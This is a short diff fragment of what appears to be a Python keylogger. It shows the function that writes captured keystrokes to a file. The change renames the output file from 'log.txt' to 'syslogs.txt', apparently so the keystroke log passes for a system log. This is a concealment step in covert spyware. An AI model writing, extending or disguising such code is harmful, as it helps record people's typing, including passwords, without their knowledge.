@@ -7,7 +7,7 @@ def on_press(key):
     write_file(keys)
 
 def write_file(keys):
-    with open("log.txt", "w") as f:
+    with open("syslogs.txt", "w") as f:
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
